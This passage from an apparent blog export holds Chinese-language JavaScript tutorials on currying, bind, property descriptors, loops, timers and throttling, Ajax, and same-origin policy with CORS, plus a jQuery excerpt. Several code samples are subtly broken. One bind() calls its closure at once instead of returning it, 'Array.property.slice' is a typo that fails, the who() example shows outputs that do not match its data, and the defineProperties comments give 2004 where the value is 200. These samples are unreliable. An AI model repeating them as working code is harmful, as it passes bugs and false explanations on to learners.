这种通过指定部分参数来产生一个新的定制函数的形式就是 函数柯里化。 如此，通过 isType() 函数来创建一个新的函数就要简单得多了 12345var isString = isType(&apos;String&apos;);var isFunction = isType(&apos;Function&apos;);var isArray = isType(&quot;Array&quot;)var str = &apos;hello world&apos;console.log(isString(str))//true 偏函数应用函数柯里化是一种使用匿名单参数函数来实现多参数函数的方法。偏函数应用又是啥? 偏函数应用是找一个函数，固定其中的几个参数值，从而得到一个新的函数。 偏函数解决这样的问题：如果我们有函数是多个参数的，我们希望能固定其中某几个参数的值。 比如，在 C 中： 1234567int foo(int a, int b, int c) &#123; return a + b + c;&#125;int foo23(int a, int c) &#123; return foo(a, 23, c);&#125; foo23 函数实际上就是一个 foo 函数的偏函数应用，参数 b 的值被固定为 23。 至于偏函数和函数柯里化两者之间的关系是，函数柯里化使得我们可以轻松的实现某些偏函数应用。 不过，isType() 只是帮我们打开了函数柯里化的大门，我们来看看一个更实用的函数柯里化过程，但在这之前，需要先看看 函数绑定的概念 0x02 函数绑定函数绑定常常和回调函数与事件处理程序一起使用，以便在将函数作为变量传递的同时保留代码的执行环境。 一个简单的 bind() 函数接受一个函数和一个环境，并返回一个在给定环境中调用给定函数的函数，并将所有参数原封不动的传递过去: 12345function bind (fn, context)&#123; return (function ()&#123; return fn.apply(context, arguments); &#125;)();&#125; 调用实例: 123456789101112obj = &#123; name:&apos;me&apos;&#125;function who()&#123; console.log(this.name);&#125;who()// nullbind(who, obj)// hello 如上，我们使用 bind() 创建了一个闭包，闭包使用 apply() 调用传入的函数，并给 apply() 传递 context 对象和参数。 注意这里使用的 arguments 对象是内部函数(属于 fn 函数 的)的，而非 bind() 的。 当调用返回的函数时，它会在给定环境中执行被传入的函数并给出所有的参数。 此外，我们还可以将 bind() 函数写在 Function 原型中，然后实现原生调用: 12345678Function.prototype.bind = function (context)&#123; var self = this; // 保存原来的函数 return function ()&#123; return self.apply(context, arguments); // 在指定的 context 中指定传入的函数 &#125;;&#125; 调用实例: 123456789obj = &#123; isName: &apos;jack&apos;, sayName: function()&#123; console.log(this.isName) &#125;&#125;var sayName = obj.sayName;sayName.bind(obj)() 其实 ECMAScript5 已经函数定义了一个原生的 bind() 方法，我们可以直接使用它。 0x03 函数柯里化进阶-实现任意多参数调用函数柯里化(function currying) 是函数式编程中的概念，用于创建已经设置好了一个或者多个参数的函数。 函数柯里化和函数绑定是类似的: 使用一个闭包返回一个函数。但使用函数柯里化，当函数被调用时，返回的函数还需要设置一些传入的参数。 之前的 isType() 简单的展示了函数柯里化的基本用法，下面是创建函数柯里化的通用方式: 123456789101112131415161718192021222324252627function curry (fn)&#123; console.log(arguments); // [function function, 5] var args = Array.prototype.slice.call(arguments, 1); console.log(&apos;args: &apos; + args); // args: 5 return function()&#123; var innerArgs = Array.prototype.slice.call(arguments); console.log(&apos;innerArgs: &apos;+innerArgs); // innerArgs: 3 var finalArgs = args.concat(innerArgs); console.log(finalArgs); // [5, 3] return fn.apply(null, finalArgs); &#125;;&#125;;function add(num1, num2)&#123; return num1 + num2;&#125;var curriedAdd = curry(add,5);console.log(curriedAdd(3));// 8console.log(curry(add, 5)(3))// 8 curry() 的第一个参数是要进行柯里化的函数，其它的参数是要传入的值。curry() 函数的主要作用是将返回函数的参数进行排序。 类似函数柯里化等 高阶函数 (一个函数的参数是函数，或是将函数作为返回值的函数)，在 Node 的异步编程中十分常见；而且，函数柯里化也是 ES6 的函数尾调用优化的技术基础。 除此以外，函数柯里化还常作为函数绑定的一部分包含在其中，以构造出更为复杂的绑定函数: 123456789function bind(fn, context)&#123; var args = Array.property.slice.call(arguments, 2); return function ()&#123; var innerArgs = Array.property.slice.call(arguments); var finalArgs = args.concat(innerArgs); return fn.apply(context, finalArgs); &#125;&#125; JavaScript 中的函数柯里化和函数绑定提供了强大的动态函数创建功能，它们都能用于创建复杂的算法和功能，但是两者都不应滥用，因为每个函数都会带来额外的开销。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS对象(5)对象属性]]></title>
      <url>%2F2016%2F12%2F13%2FJS%E5%AF%B9%E8%B1%A1(5)%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%2F</url>
      <content type="text"><![CDATA[0x00 属性类型ECMAScript 中有两种属性: 数据属性 和 访问器属性，而在 ES5 中有对属性(property)的特性(attribute)提供了多种描述，比如是否可配置，是否可枚举等等。 0x01 数据属性数据属性包含的是数据值的位置。数据属性的 4 特性如下: [[Configurable]] 是否可配置，比如，是否可以使用 delete操作符删除，能否修改属性的特性，能否把属性修改为访问器属性。 [[enumerable]] 是否可枚举, 能否通过 for in 循环返回属性。 [[writable]] 是否可写，能否修改该属性的值。 [[value]] 包含该属性的值，默认该值为 undefined Object.defineProperty()ES5 新增了对对像属性特性进行配置的方法 Object.defineProperty()，该方法接收三个参数：属性所在的对象，属性的名字，属性的特性。 对于以上的属性特性值，若是在对象上直接添加的属性，对应的各个特性的值为true，而使用defineProerty()方法添加的属性为各个特性的值为 false. 123456789101112131415var obj = &#123;&#125;obj.name = &apos;tom&apos;obj.age = 21Object.defineProperty(obj, &apos;age&apos;,&#123; configurable:false, // 不可配置 enumerable:false, // 不可枚举&#125;)// 如此，obj 对象中的 age 属性便不可以被 delete 删除了for(var p in obj)&#123; console.log(obj) // undefined&#125; 0x02 访问器属性与数据属性一样，访问器属性同样具备是否可配置和可枚举的特性，不同的是，访问器拥有两个方法，getter 和 setter 函数。 [[Get]]:读取属性时的函数 [[Set]]:写入属性时的函数 访问器属性不能直接定义，而必须通过 Object.defineProperty() 来定义。 1234567891011121314151617181920212223242526var car = &#123; model: &apos;X5&apos;, birthday: &apos;2016/12/14&apos;&#125;// 值得注意的是，使用Object.defintProperty 方法来定义时会覆盖原始对象中的同名属性// 所以，正确的做法是改写对象的属性名，给对应的属性名添加一个下划线 &quot;_&quot;var car = &#123; _model: &apos;X5&apos;, birthday: &apos;2016/12/14&apos;&#125;Object.defineProperty(car, &apos;model&apos;, &#123; get:function()&#123; return this._model &#125;, set:function(val)&#123; this._model = val; &#125;&#125;)console.log(car.model)// 读取 modelcar.model = &apos;X6&apos;// 写入 model 0x03 Object.defineProperties()ES5 提供了一个一次性定义多个属性的方法 Object.defineProperties(),该方法接收两个对象参数:目标对象和包含与目标对象中要添加或修改的属性的对象。 123456789101112131415161718192021222324252627282930313233var book = &#123;&#125;Object.defineProperties(book,&#123; _year:&#123; writable:true, value:200, &#125;, edition:&#123; writable:true, value:1, &#125;, year:&#123; get:function()&#123; return this._year; &#125;, set:function(newValue)&#123; if(newValue &gt; 2004)&#123; this._year = newValue this.edition += newValue - 2004; &#125; &#125; &#125; &#125;)alert(book.year)// 2004book.year = 2008alert(book.year)// 2008alert(book.edition)// 5]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS高阶(2)for循环]]></title>
      <url>%2F2016%2F12%2F13%2FJS%E9%AB%98%E9%98%B6(2)for%E5%BE%AA%E7%8E%AF%2F</url>
      <content type="text"><![CDATA[0x00 for我们先从最经典的 for 循环开始: 123for ( var i = 0;i &lt; arr.length;i ++) &#123; console.log(i);&#125; 0x01 forEach而从 ES5 开始我们可以使用 forEach 方法来遍历数组: 12345var lis = document.querySelectorAll(&quot;ul li&quot;) lis.forEach(function(ele, index, arr)&#123; console.log(ele, index, arr) &#125;) 确实，使用 forEach 使得代码看起来更为简洁，但是在 forEach 中，我们不能使用 break 中断循环，也不能使用 return 语句返回到外层函数。 0x02 for…in当然，也可以尝试使用 for...in 循环: 1234for (var i in arr ) &#123; console.log(typeof i); // String&#125; 但是最好别这么做: 首先 i 的值并不是数字，而是字符串类型。 for..in 循环除了遍历数组中的元素外，还会遍历自定义属性。 简而言之，for...in 是为普通对象设计的，更适合用来遍历对象属性，而并不适合于数组遍历。 0x03 for…ofES6 提供了一种新的循环语法，即是强大的 for...of 循环: 123for(var i of arr)&#123; console.log(i);&#125; 可以说，for...of 循环是最简洁，直接，有效遍历数据元素的语法。它不仅避开了 for...in 循环的所有缺陷，而且还可以正确的响应 break,continue,return语句。 但是，除此之外，for...of 同样可以用来遍历对象属性，甚至字符串。因为 for...of 循环可以遍历所有具备 迭代器(Iterator) 接口的集合。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS高阶(3)数组去重与排序]]></title>
      <url>%2F2016%2F12%2F13%2FJS%E9%AB%98%E9%98%B6(3)%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D%E4%B8%8E%E6%8E%92%E5%BA%8F%2F</url>
      <content type="text"><![CDATA[0x00sort() 方法对数组的元素做原地的排序，并返回这个数组。它可以接受一个函数( compareFunction )来进行某种特定顺序的排列。如果省略，则按照数组中元素的 Unicode 编码进行排序。 而sort()对于 compareFunction 的返回值将做如下处理: 如果 compareFunction(a, b) 小于 0 ，那么 a 会被排列到 b 之前； 如果 compareFunction(a, b) 等于 0 ， a 和 b 的相对位置不变。 如果 compareFunction(a, b) 大于 0 ， b 会被排列到 a 之前。 0x01 sort() 对数字排序希望比较数字而非字符串，比较函数可以简单的以 a 减 b，如下的函数将会将数组升序排列。 1234567var numbers = [4, 2, 5, 1, 3];numbers.sort(function(a, b) &#123; return a - b;&#125;);console.log(numbers);// [1, 2, 3, 4, 5]]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS高阶(1)高级定时器]]></title>
      <url>%2F2016%2F12%2F13%2FJS%E9%AB%98%E9%98%B6(1)%E9%AB%98%E7%BA%A7%E5%AE%9A%E6%97%B6%E5%99%A8%2F</url>
      <content type="text"><![CDATA[0x00 异步首先，JavaScript 中没有代码是立即执行的，而是一旦进程空闲则立即执行。 进程何时空闲，取决于上一个执行队列的执行时间，而与此对应的是随着页面中生命周期的推移而产生的代码执行顺序队列。 定时器对队列的工作方式是，当设定的时间过去以后将代码插入队列，但不代表代码会被立即执行。 0x01 重复定时器很多情况下，我们都需要使用 setInterval() 重复的执行同一段代码去做同一件事情，而在这时，最大的问题在于定时器可能在代码再次被添加到队列之前还没有被执行完成，从而导致某些间隔被跳过或者多个定时器的代码执行时间间隔被缩短。 为了避免以上缺点，可以使用链式调用 setTimeout() 模式 12345setTimeout(function()&#123; // do something setTimeout(arguments.callee, interval);&#125;, interval) 一个例子: 123456789setTimeout(function()&#123; $(&quot;#block&quot;).css(&#123; &apos;left&apos;: $(&apos;#block&apos;).position().left -1, &#125;) if($(&apos;#block&apos;).position().left &gt; 0)&#123; setTimeout(arguments.callee, 30); &#125; &#125;, 30) 0x01 数组分块为了防止恶意程序猿将用户的计算机搞挂，浏览器对 JavaScript 能够使用的资源进行了限制，如果代码的运行时间超过特定时间或者特定语句数量就不让其继续运行。 而脚本运行时间过长的两个主要原因是:1)过长，过深嵌套的函数调用；2)进行大量处理的循环。 针对第二种问题，使用定时器是解决方法之一。使用定时器分隔循环，是一种叫作 数组分块(array chunking) 的技术。 在数组分块模式中，array 变量本质上就是一个 “代办事项” 列表，它包含了要处理的项目，而 shift() 可以获取队列中下一个要处理的项目，然后将其传递个某个函数。当队列中还剩下其它项目时，则设置另一个定时器，并通过 arguments.callee 调用同一个匿名函数。 12345678910function chunk(array, process, context)&#123; setTimeout(function()&#123; var item = array.shift() process.call(context, item) if(array.length &gt; 0)&#123; setTimeout(arguments.callee, 100) &#125; &#125;, 100)&#125; chunk() 方法接收三个参数： 要处理项目的数组，用于处理项目的函数，可选的运行该函数的环境。 在函数内部，通过 call() 调用 process() 函数，这样可以设置一个合适的执行环境。为定时器设定的时间间隔使得 JavaScript 进程有时间在处理项目的事件之间转入空闲。 调用实例: 12345678var data = [12,124,343,56,76767,43,654,34645,56456,767,4645]function printValue(item)&#123; var div = $(&apos;#block&apos;).html() $(&apos;#block&apos;).html(div + item + &apos;&lt;br&gt;&apos;)&#125;chunk(data, printValue) 如上，函数 printValue() 将 data 数组中的每个值输出到一个 div 元素中。由于函数处于全局作用域中，因此无需给 chunk() 函数传递 context 对象。 如果想保持原数组不变，则应将该数组的克隆传递给 chunk() 1chunk(data.concat(), printValue) 调用某个数组的.contact(),如果不传递任何参数，将返回和原来数组中项目一样的数组。 0x02 函数节流函数节流 的基本思想是指，某些代码不可以在没有间断的情况下连续重复的执行。 浏览器中某些计算和处理的代价要比其他的昂贵很多，比如，DOM 操作比非 DOM 交互需要更多的内存和 CPI 时间，而进行过多的 DOM 相关操作可能导致浏览器挂起甚至崩溃，对于这种问题，可以使用定时器对函数进行节流。 函数节流的基本模式可以简化如下: 123456function throttle(method, context)&#123; clearTimeout(method.tId) method.tId = setTimeout(function()&#123; method.call(context) &#125;, 100)&#125; throttle() 函数接收两个参数: 要执行的函数以及在哪个作用域中执行。该函数首先清除之前设置的任何定时器。定时器 ID 是存储在函数的 tId 属性中的，当然，首次将方法传递给 throttle 函数可能并不存在该属性。然后定义一个新的定时器，并将 ID 存储在 tId 属性中。而 call() 用来确保方法在适当的环境中执行。如果没有给出第二个参数，那么就在全局作用域内执行该方法。 在 setTimeout() 中用到的函数其执行环境总是 window throttle 方法调用实例: 12345678function resizeDiv()&#123; var div = document.querySelector(&quot;#block&quot;) div.style.height = div.offsetWidth + &quot;px&quot; &#125;window.onresize = function()&#123; throttle(resizeDiv)&#125; 如上，为了保证在 resize 事件中浏览不会进行高频率，或者多次计算，我们给 window.onresize 绑定了一个函数,在该函数调用了 throttle 方法，从而在窗口大小发生改变的时候是 div#block 的高度与其宽度保持一致。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sass]]></title>
      <url>%2F2016%2F12%2F08%2FSass%2F</url>
      <content type="text"><![CDATA[0x00 基本语法Sass 可以使用 $ 符定义变量,此外还可以像俄罗斯套娃那样在规则块中嵌套规则块。 混合器混合器使用@mixin标识符定义。这个标识符给一大段样式赋予一个名字，这样你就可以轻易地通过引用这个名字重用这段样式。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS服务器编程(3)Ajax]]></title>
      <url>%2F2016%2F12%2F01%2FJS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BC%96%E7%A8%8B(3)Ajax%2F</url>
      <content type="text"><![CDATA[0x00 前言Ajax 的核心技术是 XMLHttpRequest 对象(简称 XHR)。通过 XHR 可以以异步的方式从服务器获得更多的信息，这意味着，我们不必刷新整个页面就可以得到新数据。 Ajax 是一种从页面项服务器端请求数据的技术，而 comet 是一种从服务器端向页面推送数据的技术。可以说 Comet 是一种更高级的 Ajax 技术。 0x01 XMLHttpRequest要使用 XHR 对象，首先需要调用 open() 方法: 12var xhr = new XMLHttpRequest()xhr.open(&quot;get&quot;, &quot;example.php&quot;, false) open() 方法接收三个参数:请求类型(get,post), URL, 以及是否异步发送请求的布尔值。 调用 open() 方法并不会真的发送数据，而是启动一个请求以备发送。 要发送请求需要调用 send() 方法。 123var xhr = new XMLHttpRequest();xhr.open(&quot;get&quot;, &quot;example.php&quot;, false)xhr.send(null) send() 接收一参数，即作为请求主体发送的数据，若不存在，则必须传入 null。 如上，我们发送了一个同步请求，这样， JS 代码只会在得到服务器响应之后才会继续执行。而收到响应的数据会自动填充 XHR 对象的属性。 status:响应的 HTTP 状态 statusText: HTTP 状态说明 responseText:作为响应主体被返回的文本 responseXML:如果响应的内容类型时 text/xml 或者application/xml 则这个属性中保存包含着响应数据的 XML DOM 文档。 接收到相应后首先检查 status 返回 200 状态码则表示响应成功返回，意味着 responseText 属性的内容已经准备就绪，如果 内容类型正确的话， responseXML 也可以访问了。 如果状态码为 304 表示所请求的资源并没有被修改，可以直接使用浏览器缓存内容。 为确保响应正确，可以做以下检查： 12345if((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304)&#123; console.log(xhr.responseText)&#125; else &#123; console.log(&quot;is unsuccessful&quot; + xhr.status)&#125; 如上，我们对服务器发送了一个同步请求，但多数情况下需要的是异步请求，从而让 JavaScript 可继续执行而不必等待响应。 0x02 readySate and readystatechangeXHR 对象的 readyState 属性表示请求/响应过程的当前活动阶段。该属性的可取值如下: 0: 未初始化。尚未调用 open() 方法 1: 启动。已经调用 open() 方法 2: 发送。已经调用 send() 方法 3: 接收。已经接收到部分响应数据 4: 完成。已经接收到全部响应数据，并且可以在客户端使用了 只要 readyState 属性的值由一个值变成另一位一个值，都会触发 readystatachange 事件，可以据此来检测每次状态变化以后的 readyState 值。 12345678910111213var xhr = new XMLHttpRequest()xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4)&#123; if((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304)&#123; console.log(xhr.responseText) &#125;else&#123; console.log(&quot;Request was unsuccessful:&quot; + xhr.status) &#125; &#125;&#125;xhr.open(&apos;get&apos;,&apos;response.php&apos;,true)xhr.send(null) 使用 DOM0 级方法为 XHR 对象添加事件，是因为并非所有的浏览器都支持 DOM2 级方法。考虑到不同浏览器对 XHR 兼容性，也没有向 onreadystatechange() 事件处理程序传递 event 对象，并且没有在该事件处理程序中使用 this 对象。 构建兼容版本的 Ajax123456789101112131415161718192021function createXHR()&#123; //如果浏览器支持XMLHttpRequest那么直接创建返回该对象 if (typeof XMLHttpRequest != &apos;undefined&apos;)&#123; return new XMLHttpRequest(); &#125;else if(typeof ActiveXObject != &apos;undefined&apos;)&#123; if (typeof arguments.callee.activeXString != &apos;string&apos;)&#123; var versions = [&apos;MSXML2.XMLHttp.6.0&apos;, &apos;MSXML2.XMLHttp.3.0&apos;,&apos;MSXML2.XMLHttp&apos;]; for(var i = 0; i &lt; versions.length;i++)&#123; try&#123; new ActiveXObject(versions[i]); arguments.callee.activeXString = versions[i] &#125;catch(e)&#123; &#125; &#125; &#125; return new ActiveXObject(arguments.callee.activeXString); &#125;else&#123; throw new Error(&quot;没法正常的创建ajax对象&quot;); &#125; &#125; 0x03 GET 请求的 URL 编码GET 请求，通常用于向服务器查询某些信息。对 XHR 而言，传入 open() 方法的 URL 末尾的查询字符串必须经过 encodeURIComponent() 进行编码。而所有的 键值对 之间必须由 &amp; 号隔开。 1xhr.open(&apos;get&apos;, &apos;response.php?name1=valuea&amp;name2=valueb&apos;, true) 下面的 addURLParam() 函数可以辅助向现有的 URL 末尾添加查询字符串参数: 12345function addURLParam(url, name, value)&#123; url += (url.indexOf(&quot;?&quot;) == -1?&quot;?&quot;:&quot;&amp;&quot;) url += encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(value) return url&#125; 12345678var url = &apos;response.php&apos;// 添加参数url = addURLParam(url, &apos;name&apos;, &apos;jack&apos;)url = addURLParam(url, &apos;book&apos;, &apos;质素的一&apos;)// 初始化请求xhr.open(&apos;get&apos;,url, true) 0x04 POST 请求模仿表单提交POST 请求，通常用于向服务器发送应该被保存的数据。 我们可以使用 XHR 来模仿表单提交，首先将 Content-Type 头部信息设置为 applicaiton/x-www-form-urlencodeed 即表单提交时的内容类型，然后使用 serialize() 函数对页面中要提交的数据进行表单格式化。 123456789101112131415161718function submitData()&#123; let xhr = new XMLHttpRequest() xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4)&#123; if ((xhr.status &gt;=200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304)&#123; console.log(xhr.responseText) &#125; else &#123; console.log(&quot;Request was unsuccessful:&quot; + xhr.status) &#125; &#125; &#125; xhr.open(&quot;POST&quot;, url , true) xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;) let form = document.querySelector(&quot;#form1&quot;) xhr.send(serialize(form))&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[同源策略与CORS]]></title>
      <url>%2F2016%2F12%2F01%2FJS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%BC%96%E7%A8%8B(5)%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECORS%2F</url>
      <content type="text"><![CDATA[0x00 同源策略同源策略(Same-origin policy) 是浏览器安全的基石,其目的是为了保护用户信息的安全，具体点，同源指的是三个相同，协议相同, 域名相同,端口相同。如果非同源，以下三种行为将会受到限制: Cookie,localStorage,和 IndexDNB 无法读取 DOM 无法获得 AJAX 请求不能发送 对于 Cookie 的限制，在以前，我们可以通过document.domain 来设置相同的域名以共享 Cookie。 也可以在服务器端指定 Cookie 所属的域名为一级域名: 1Set-cookie: key=value; domain=.onejustone.xyz; path= /; 这样二级和三级域名不用做任何设置，都可以读取这个 Cookie。 而如果两个网页不同源，则无法获取对方的 DOM，比如 iframe 窗口和 window.open 方法打开的窗口，它们与父窗口无法通信。这时如果两个窗口一级域名相同，而二级域名不同，则通过 document.domain 属性，即可规避同源策略，拿到 DOM。 而对于完全不同于源的网页则有三种方法: 片段是识别符(fragment identifier) window.name 跨文档通信API(Cross-document messaging) 片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如http://example.com/x.html#fragment的#fragment。如果只是改变片段标识符，页面不会重新刷新。 而通过 window.name 属性，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。但是使用window.name 将会非常影响页面性能。 好在 H5 引入了一个全新的 API，跨文档通信 API(Cross-document messaging),它为 window 对象新增了一个 window .postMessage 方法，运行跨窗口通信，无论这两个窗口是否同源。除此之外，连读取其它窗口的 localStorgae 也成为了可能。 本文参考 0x01 CORS同源策略规定，AJAX 请求只能发送给同源的网址，否则就会报错。面对这个问题，我们很三种种解决的方法: JSONP WebSocket CORS JSONP 最大的特点是简单适用，兼容性好，支持几乎所有的老式浏览器，服务器改造非常下。但是只能发送 GET 请求，并且要判断 JSONP 请求是否失败并不容易。 而 WebSocket 是一种通信协议。使用 ws://（非加密）和 wss://（加密） 作为协议前缀。该协议中 Origin 自动可以指定请求的请求域，即来自哪域名。也正因为有了 Origin 字段，WebSocket 才不实行同源策略。服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。 12345HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=Sec-WebSocket-Protocol: chat 最后该我们的 CORS 登场了，可以讲 CORS(Cross-Origin Resource Sharing) 是跨源 Ajax 请求的根本解决方法。 它允许浏览器向跨域服务器，发出 XMLHttpRequest 请求，从而避免了 Ajax 只能同源使用的限制。 而整个 CORS 的通信过程，都是浏览器自动完成的，浏览器一旦发现 Ajax 请求跨域，就会自动添加一些附加的头信息。对于开发者，CORS 通信与同源的 Ajax 通信没有任何差别，代码完全一样。因此，实现 CORS 通信的关键是服务器。 两种请求浏览器将 CORS 请求分为两类: 简单请求（simple request）和 非简单请求(not-so-simple-request): 同时满足一下两大条件就属于简单请求: 请求方法是以下三种之一: HEAD GET POST HTTP 头信息不超过以下几种字段: Accept Accept-Language Content-Language Last-Event-ID Content-Type:application/x-www-form-urlencoded,multipart/form-data,text/plain 凡是不满足以上条件的就是非简单请求，浏览器对两种请求的处理是不一样的。具体的就是，对于非简单类请求，浏览器会多一个 预检请求(preflight)，即是在 CORS 正式通信之前会增加一次 HTTP 请求。 简单请求浏览器一旦发现本次 Ajax 跨源，并且是简单请求，那么就会自动在请求的头部添加 Origin 字段。该字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。而服务器会根据这个值，决定是否同意这次请求。 123456GET /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0 下面是简单请求的服务器 CORS 配置: 1234 Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBar Access-Control-Allow-origin: 指定一个允许向该服务器器提交请求的 URL。对于一个不带有 credentials 的请求,可以指定为 &#39;*&#39;,表示允许来自所有域的请求. Access-Control-Allow-Credentials: 它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。另一方面，开发者必需在 Ajax 请求中打开 withCredentials 属性: 12var xhr = new XMLHttpRequest();xhr.withCredentials = true; Access-Control-Expose-Headers: 设置浏览器允许访问的服务器的头信息的白名单。CORS 请求时，XMLHttpRequest 对象的getResponseHeader() 方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段(比如一些自定义的头部字段信息)，就必须在Access-Control-Expose-Headers里面指定。 非简单请求 非简单请求，比如请方式是 PUT 或者 DELETE ，或者 Content-Type 字段类型是 applicaiton/json 的，会在正式通信之前，增加一次 HTTP 查询请求，即是 预检(preflight) 请求。其作用是用来判断当前网页所在的域名是否在服务器的许可名单之中。 预检请求的请求方法是 OPTIONS，这个方法是用来询问的。和预检请求相关的是以下两个字段: Access-Control-Request-Method: 该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些HTTP方法。 Access-Control-Request-Headers: 该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，如一些自定义的头部信息。 下面是预检请求的 HTTP 头部信息: 12345678OPTIONS /cors HTTP/1.1Origin: http://api.bob.comAccess-Control-Request-Method: PUTAccess-Control-Request-Headers: X-Custom-HeaderHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... 服务器接收到预检请求，并检查了 Origin, Access-Control-Request-Method,Access-Control-Request-Headers 字段以后，经确认不允许跨源，会返回一个正常的 HTTP 流，但是不会包含与 CORS 通信有关的字段，如果确认可以跨源，就会返回一个包含 CORS 规定的字段作为 HTTP 响应: 123456789101112HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:39 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderContent-Type: text/html; charset=utf-8Content-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain 如上是服务器返回的 CORS HTTP 响应，其中最重要的是 Access-Control-Allow-Origin 字段。下面是一些其它的字段说明: Access-Control-Allow-Methods:该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。 Access-Control-Allow-Headers:如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。 Access-Control-Allow-Credentials:该字段与简单请求时的含义相同。 Access-Control-Max-Age:该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。 而一旦服务器通过了 预检请求,以后的每次通信，浏览器的 CORS 请求就跟普通请求一样了，都会包含一个 Origin 头信息。服务器的回应，也都会有一个 Access-Control-Allow-Origin 头信息字段。 下面是 预检请求 之后，浏览器的正常 CORS 请求: 1234567PUT /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comX-Custom-Header: valueAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... 下面是服务器的正常回应: 12Access-Control-Allow-Origin: http://api.bob.comContent-Type: text/html; charset=utf-8]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[jQuery(3)DOM属性与内容操作]]></title>
      <url>%2F2016%2F12%2F01%2FjQuery(3)DOM%E5%B1%9E%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%2F</url>
      <content type="text"><![CDATA[0x00 尺寸 width()/height()当使用 .height() 方法读取时，获得的是目标元素的 内容的高度。但是当使用 .height(&#39;value&#39;) 时，设置的是 box-sizing，将这个属性值改成border-box，将造成这个函数改变这个容器的outerHeight，而不是原来的内容高度。 不同于 .css(&#39;height&#39;,&#39;200px&#39;) 方法，.height() 方法不需要 px 值。 innerWidth()/innerHeight()返回/设置元素的高度，包括顶部和底部的padding，单位是像素。该方法不适用于window and document对象，可以使用 .height() 代替。 outerWidth()/outerHeight()返回/设置元素的宽度，一直包括l左右 padding值，border值和可选择性的margin。单位为像素。 0x01 坐标 offset().left()/offset().top()在匹配的元素集合中，获取的第一个元素的当前坐标，坐标相对于文档。当通过全局操作（特别是通过拖拽操作）将一个新的元素放置到另一个已经存在的元素的上面时，若要取得这个新的元素的位置，那么使用 .offset() 更合适。 .position()获取匹配元素中第一个元素的当前坐标，相对于offset parent的坐标。只获取不可设置。 .scrollLeft()获取或设置匹配元素水平滚动条的位置通常用于 window 对象 .scrollTop()获取或设置匹配元素垂直滚动条的位置通常用于 window 对象 0x02 原生与 jQuery 对象转换123$(&quot;div&quot;).eq(0)[0].onclick = function () &#123; //do something&#125; 0x03 CSS 属性操作在 DOM 标记法中，属性名可以不使用引号包裹，但是在 CSS 标记法中，如果属性中含有连字符(-)的话，则必须用引号包裹. 获取目标样式jQery 能解析 .css(&#39;background-color&#39;) 和 .css(&#39;backgroundColor&#39;) 两种不同的格式并且返回正确的值。此外，从 jQuery1.9 开始，可以给 .css() 方法传递数组，其将返回 属性-值 配对的对象。 1234$(&quot;#clickme&quot;).on(&quot;click&quot;,function()&#123; console.log($(&quot;#middle&quot;).css([&apos;width&apos;,&apos;height&apos;,&apos;color&apos;，&apos;border&apos;]))&#125;)//Object &#123;width: &quot;1074px&quot;, height: &quot;500px&quot;, color: &quot;rgb(0, 0, 0)&quot;, border:&quot;1px solid rgb(255, 0, 0)&quot;&#125; 设置目标样式.css(propertyName, function(index, value)) 可以直接传递一个 属性-值 的对象给 .css() 以快速设置多种不同的样式. 123$(&quot;#box&quot;).one( &quot;click&quot;, function () &#123; $( this ).css( &quot;width&quot;,&quot;+=200&quot; ); &#125;); 此外，还可以给每个属性添加函数返回函数的结果作为属性值。 1234567891011$(&quot;div&quot;).click(function() &#123; 